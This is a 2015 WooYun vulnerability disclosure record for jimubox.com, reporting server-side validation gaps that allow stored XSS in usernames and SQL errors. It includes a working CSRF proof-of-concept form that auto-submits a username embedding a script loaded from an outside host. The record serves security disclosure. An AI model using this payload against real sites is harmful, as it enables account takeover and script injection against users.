{"id": 18167, "wybug_id": "wooyun-2015-0116773", "wybug_title": "积木盒子三处漏洞集合（可查询SQL语句）", "wybug_corp": "jimubox.com", "wybug_author": "q601333824", "wybug_date": "2015-05-28 17:59", "wybug_open_date": "2015-07-12 22:54", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-12：\t细节向公众公开  简要描述： 积木盒子三处小漏洞集合 详细说明：      1.这个漏洞用到的是第三方帐号，我用第三方帐号登录，到达这个页面 \n\n   2.停在这个页面不要动，从上面图上，看出来，用户名注册，不能使用符号，但是这里只进行了本地验证用户名格式，服务器没有验证，post提交就行，可以注册一个XSS用户名     ①。先用第三方帐号登录，停在那个页面不要动，访问下面这段下面     ②.\n<html><form id=\"csrf\" name=\"csrf\" action=\"https://www.jimubox.com/oauth/register\" method=\"POST\"><input type=\"text\" id=\"haha\" name=\"UserName\" value=\"XXXXXXXX\" /><input type=\"text\" name=\"password\" value=\"a456a456\" /></form><script>       var shuzu=['0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','a','b','c','d','e','f','g'];        function test(){                      var uid=\"\";                       for(var i=0;i<=15;i++)                                  {                                          var tbs=Math.floor(Math.random()*29);                                  uid=uid+shuzu[tbs];                                   }                                 return(uid);                }       var UserName=document.getElementById(\"haha\");       UserName.value=test()+\"<script/src='//fripside.sinaapp.com/jimuhezi.js'>\"       setTimeout(\"document.csrf.submit();\",2000);</script></body></html>\n  3.如图. 名字的地方的被插入XSS. \n\n \n\n------------------------------------------------------------------------------------------------  4.两种SQL报错     ①.更新数据 \n\n     ②.插入数据 \n\n   -------------------------------------------------------------------------------------------  5.论坛名字的地方，只进行本地验证，服务器没有验证，导致注册的名字可以插入XSS \n\n   漏洞证明：    1.漏洞证明看上面  2.①.更新数据 \n\n     ②.插入数据 \n\n   3.\n\n \n\n   修复方案：     1.服务器验证下名字格式   2.配置不当,当参数过长，会导致SQL报错    3.只证明漏洞存在   版权声明：转载请注明来源 q601333824@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-05-28 18:10 厂商回复： 感谢您的关注，我们将马上进行修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-05-29 11:13 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  这个比你以为的要牛逼啊    \n     2015-05-29 13:42 |    \t\tq601333824 \t\t\t( 普通白帽子  |\t\t\t        Rank:217 漏洞数:49        | 出自《丹特丽安的书架》---吾问汝,汝为人否...)\t\t \n  @xsser 其实我小白，看人家有送礼物，想去混一下一 一+    \n     2015-07-12 20:20 |    \t\tKeen \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | ...)\t\t \n  这思路不错啊     \n     2015-07-13 07:22 |    \t\t#6c6c6c \t\t\t( 普通白帽子  |\t\t\t        Rank:291 漏洞数:47        | 像一条狗孤独的活着，渴望的活着，绝望的活...)\t\t \n  二次开发毁一生    \n     2015-07-14 20:53 |    \t\tBMa \t\t\t( 普通白帽子  |\t\t\t        Rank:1776 漏洞数:200        )\t\t \n  @xsser 这不是二次注入么，还有越权重置全网用户密码  csrf修改用户昵称倒没多大用处    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}